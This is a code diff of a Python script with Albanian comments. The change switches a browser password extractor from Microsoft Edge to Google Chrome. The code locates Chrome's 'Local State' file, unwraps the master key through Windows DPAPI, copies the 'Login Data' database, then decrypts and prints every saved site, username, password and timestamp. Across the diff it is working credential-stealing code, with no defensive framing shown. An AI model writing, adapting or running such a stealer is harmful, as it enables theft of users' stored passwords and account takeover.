@@ -7,16 +7,15 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
-
-def browser_date_and_time_edge(browser_data):
+def browser_date_and_time_chrome(browser_data):
     # Kjo do te kthej nje objekt datetime.datetime ne menyr qe ta marrim kohen qe kur ka ndodhur ruajtja e fjalkalimit
     return datetime(1601, 1, 1) + timedelta(microseconds=browser_data)
 
 
-def fetching_encryption_key_edge():
+def fetching_encryption_key_chrome():
     # Pathi qe eshte ne kompjuterin e shfrytzuesit
     local_computer_directory_path = os.path.join(
-        os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge",
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
         "User Data", "Local State")
 
     with open(local_computer_directory_path, "r", encoding="utf-8") as f:
@@ -33,8 +32,7 @@ def fetching_encryption_key_edge():
     # Kthen qelsin e dekriptuar
     return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
 
-
-def password_decryption_edge(password, encryption_key):
+def password_decryption_chrome(password, encryption_key):
     try:
         iv = password[3:15]
         password = password[15:]
@@ -51,11 +49,10 @@ def password_decryption_edge(password, encryption_key):
         except:
             return "No Passwords"
 
-
-def edge():
-    key = fetching_encryption_key_edge()
+def chrome():
+    key = fetching_encryption_key_chrome()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Microsoft", "Edge", "User Data", "Default", "Login Data")
+                           "Google", "Chrome", "User Data", "Default", "Login Data")
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
 
@@ -73,7 +70,7 @@ def edge():
         main_url = row[0]
         login_page_url = row[1]
         user_name = row[2]
-        decrypted_password = password_decryption_edge(row[3], key)
+        decrypted_password = password_decryption_chrome(row[3], key)
         date_of_creation = row[4]
         last_usuage = row[5]
 
@@ -87,10 +84,10 @@ def edge():
             continue
 
         if date_of_creation != 86400000000 and date_of_creation:
-            print(f"Creation date: {str(browser_date_and_time_edge(date_of_creation))}")
+            print(f"Creation date: {str(browser_date_and_time_chrome(date_of_creation))}")
 
         if last_usuage != 86400000000 and last_usuage:
-            print(f"Last Used: {str(browser_date_and_time_edge(last_usuage))}")
+            print(f"Last Used: {str(browser_date_and_time_chrome(last_usuage))}")
         print("=" * 100)
     cursor.close()
     db.close()
